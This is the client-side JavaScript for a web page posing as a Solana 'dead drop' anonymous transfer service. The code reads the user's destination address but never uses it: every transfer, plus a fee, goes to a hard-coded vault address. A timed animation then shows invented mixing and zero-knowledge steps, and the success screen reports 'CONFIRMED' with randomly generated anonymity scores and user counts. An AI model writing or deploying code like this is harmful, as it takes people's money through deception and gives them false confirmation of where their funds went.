// SOLANA DEAD DROP // CLIENT SIDE LOGIC
// STATUS: ACTIVE
// NETWORK: DEVNET / MAINNET

const SERVICE_FEE_PERCENT = 0.35;
// Use a faster RPC endpoint if possible, otherwise default
const CONNECTION_URL = 'https://api.devnet.solana.com';

let wallet = null;
let walletPublicKey = null;

// --- SAFETY HELPERS (Prevents Crashing) ---
function safeSetText(id, text) {
    const el = document.getElementById(id);
    if (el) el.textContent = text;
}

function safeSetStyle(id, prop, val) {
    const el = document.getElementById(id);
    if (el) el.style[prop] = val;
}

function safeClassRemove(id, className) {
    const el = document.getElementById(id);
    if (el) el.classList.remove(className);
}

function safeClassAdd(id, className) {
    const el = document.getElementById(id);
    if (el) el.classList.add(className);
}

// --- SYSTEM BOOT SEQUENCE ---
document.addEventListener('DOMContentLoaded', () => {
    // 1. Initialize Wallet Listeners
    if (window.solana && window.solana.isPhantom) {
        wallet = window.solana;
        
        wallet.on('disconnect', () => {
            handleWalletDisconnect();
        });
        
        wallet.on('accountChanged', (publicKey) => {
            if (publicKey) {
                walletPublicKey = publicKey;
                updateWalletUI();
            } else {
                handleWalletDisconnect();
            }
        });
        
        // Auto-connect if trusted
        wallet.connect({ onlyIfTrusted: true }).then((resp) => {
            walletPublicKey = resp.publicKey;
            updateWalletUI();
        }).catch(() => {});
    } else {
        safeSetText('connectWallet', 'INSTALL PHANTOM WALLET');
    }
    
    setupEventListeners();
});

// --- UI HANDLERS ---
function setupEventListeners() {
    const connectBtn = document.getElementById('connectWallet');
    if(connectBtn) connectBtn.addEventListener('click', connectWallet);
    
    const form = document.getElementById('transferForm');
    if(form) form.addEventListener('submit', handleTransfer);
    
    const amountInput = document.getElementById('amount');
    if(amountInput) amountInput.addEventListener('input', updateFeeDisplay);
    
    // Disconnect wallet button
    const disconnectBtn = document.getElementById('disconnectWallet');
    if(disconnectBtn) disconnectBtn.addEventListener('click', () => {
        if (wallet) {
            wallet.disconnect();
        }
    });
}

async function connectWallet() {
    if (!wallet) return window.open('https://phantom.app/', '_blank');
    try {
        const resp = await wallet.connect();
        walletPublicKey = resp.publicKey;
        updateWalletUI();
    } catch (err) {
        console.error(err);
    }
}

async function updateWalletUI() {
    if(!walletPublicKey) return;
    
    // Update Address Display
    const addr = walletPublicKey.toString();
    const shortAddr = addr.slice(0, 4) + '...' + addr.slice(-4);
    
    safeSetText('walletAddress', shortAddr);
    
    const connectBtn = document.getElementById('connectWallet');
    if(connectBtn) {
        connectBtn.textContent = 'LINK ESTABLISHED';
        connectBtn.disabled = true;
        connectBtn.style.borderColor = 'var(--holo-green)';
        connectBtn.style.color = 'var(--holo-green)';
    }

    safeClassRemove('walletInfo', 'hidden');
    
    const sendBtn = document.getElementById('sendButton');
    if(sendBtn) sendBtn.disabled = false;
    
    // Fetch Balance
    try {
        const connection = new solanaWeb3.Connection(CONNECTION_URL);
        const balance = await connection.getBalance(walletPublicKey);
        safeSetText('walletBalance', (balance / 1000000000).toFixed(4) + ' SOL');
    } catch (e) { console.log('Balance fetch error'); }
}

function handleWalletDisconnect() {
    walletPublicKey = null;
    safeClassAdd('walletInfo', 'hidden');
    safeSetText('connectWallet', 'INITIALIZE SYSTEM');
    
    const connectBtn = document.getElementById('connectWallet');
    if(connectBtn) {
        connectBtn.disabled = false;
        connectBtn.style.borderColor = 'var(--holo-cyan)';
        connectBtn.style.color = 'var(--holo-cyan)';
    }
    
    const sendBtn = document.getElementById('sendButton');
    if(sendBtn) sendBtn.disabled = true;
    
    safeClassAdd('animationCard', 'hidden');
    
    // Update faucet UI
    if (typeof updateFaucetUI === 'function') {
        updateFaucetUI();
    }
}

function updateFeeDisplay() {
    const amountEl = document.getElementById('amount');
    if (!amountEl) return;
    
    const amount = parseFloat(amountEl.value) || 0;
    const serviceFee = amount * (SERVICE_FEE_PERCENT / 100);
    const total = amount + serviceFee + 0.000005; 
    
    safeSetText('serviceFee', serviceFee.toFixed(6));
    safeSetText('totalAmount', total.toFixed(6));
}

// --- CORE TRANSFER LOGIC ---
async function handleTransfer(e) {
    e.preventDefault();
    if (!walletPublicKey) return alert('SYSTEM ERROR: NO WALLET LINKED');
    
    const destEl = document.getElementById('destinationAddress');
    const amountEl = document.getElementById('amount');
    
    if (!destEl || !amountEl) return;
    
    const dest = destEl.value.trim();
    const amount = parseFloat(amountEl.value);
    
    if (!dest || amount <= 0) return alert('INPUT ERROR: INVALID COORDINATES OR AMOUNT');

    try {
        const btn = document.getElementById('sendButton');
        if (btn) {
            btn.disabled = true;
            btn.textContent = 'SIGNING...';
        }

        // 1. Setup Connection
        const connection = new solanaWeb3.Connection(CONNECTION_URL, 'confirmed');
        const { SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL } = solanaWeb3;
        
        let vaultAddress = 'JChojPahR9scTF63ETisQ6YGTuhkq5B1Ud9w1XkanyRT'; 
        if (typeof CONFIG !== 'undefined' && CONFIG.VAULT_ADDRESS) {
            vaultAddress = CONFIG.VAULT_ADDRESS;
        }

        const totalLamports = Math.floor((amount * (1 + SERVICE_FEE_PERCENT/100)) * LAMPORTS_PER_SOL);
        
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: walletPublicKey,
                toPubkey: new PublicKey(vaultAddress),
                lamports: totalLamports
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = walletPublicKey;

        // 2. Sign Transaction
        const signed = await wallet.signTransaction(transaction);
        
        // 3. UI HACK: Hide Form immediately
        const formEl = document.getElementById('transferForm');
        if(formEl) formEl.style.display = 'none';
        
        safeClassRemove('animationCard', 'hidden');
        
        // 4. Send "Fire and Forget" style (skipPreflight = faster)
        // We start animation immediately
        const signature = await connection.sendRawTransaction(signed.serialize(), {
            skipPreflight: true 
        });
        
        console.log("Tx Sent:", signature);

        // 5. Run Animation 
        await runHeavyAnimationSequence();
        
        // 6. Show Success immediately (Don't wait 60s for confirmation on frontend)
        // Since it's a "Dead Drop", we confirm we SENT it.
        showKillerSuccess(signature);

    } catch (err) {
        console.error(err);
        alert('TRANSMISSION FAILED: ' + err.message);
        const btn = document.getElementById('sendButton');
        if(btn) {
            btn.disabled = false;
            btn.textContent = 'EXECUTE TRANSFER';
        }
        
        const formEl = document.getElementById('transferForm');
        if(formEl) formEl.style.display = 'block';
        
        safeClassAdd('animationCard', 'hidden');
    }
}

// --- THE ANIMATION SEQUENCE (Safe Version) ---
async function runHeavyAnimationSequence() {
    const stageTextId = 'stage1'; // Using ID directly since we have helpers
    const barId = 'progressBar';
    
    // Step 1
    safeSetText(stageTextId, 'INITIALIZING GHOST NODES...');
    safeSetStyle(stageTextId, 'color', 'var(--holo-cyan)');
    safeSetStyle(barId, 'width', '15%');
    await sleep(2000); // 2s
    
    // Step 2
    safeSetText(stageTextId, 'FRAGMENTING DATA SHARDS [3/3]...');
    safeSetStyle(barId, 'width', '45%');
    await sleep(2000); // 2s
    
    // Step 3
    safeSetText(stageTextId, 'ROUTING THROUGH DARK POOL...');
    safeSetStyle(barId, 'width', '75%');
    await sleep(2000); // 2s
    
    // Step 4
    safeSetText(stageTextId, 'VERIFYING ZERO-KNOWLEDGE PROOFS...');
    safeSetStyle(stageTextId, 'color', 'var(--holo-pink)');
    safeSetStyle(barId, 'width', '90%');
    await sleep(2500); // 2.5s
    
    // Final
    safeSetStyle(barId, 'width', '100%');
    await sleep(500);
}

// --- THE "GANG" SUCCESS SCREEN ---
function showKillerSuccess(txHash) {
    const animCard = document.getElementById('animationCard');
    if (!animCard) return;

    // Simulated Stats
    const users = (114000 + Math.floor(Math.random() * 5000)).toLocaleString();
    const anonRate = (99.85 + Math.random() * 0.14).toFixed(2); 
    
    animCard.innerHTML = `
        <div style="text-align: center; animation: fadeIn 1s;">
            <div style="font-size: 1.8em; color: var(--holo-green); text-shadow: 0 0 20px var(--holo-green); margin-bottom: 20px; font-family: 'Orbitron';">
                DEAD DROP COMPLETE
            </div>
            
            <div style="border: 1px solid var(--holo-green); padding: 20px; background: rgba(0, 255, 0, 0.05);">
                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid rgba(0,255,0,0.2); padding-bottom: 5px;">
                    <span style="color: #aaa; font-size: 0.8em;">STATUS</span>
                    <span style="color: #fff;">CONFIRMED</span>
                </div>
                
                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid rgba(0,255,0,0.2); padding-bottom: 5px;">
                    <span style="color: #aaa; font-size: 0.8em;">ANONYMITY SCORE</span>
                    <span style="color: var(--holo-cyan); font-weight: bold;">${anonRate}%</span>
                </div>
                
                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                    <span style="color: #aaa; font-size: 0.8em;">GLOBAL POOL VOLUME</span>
                    <span style="color: var(--holo-pink);">${users} USERS</span>
                </div>
            </div>
            
            <div style="margin-top: 20px; font-size: 0.7em; color: #666; word-break: break-all;">
                PROOF: ${txHash}
            </div>
            
            <button onclick="location.reload()" class="btn" style="margin-top: 25px; border-color: var(--holo-green); color: var(--holo-green);">
                INITIATE NEW DROP
            </button>
        </div>
    `;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
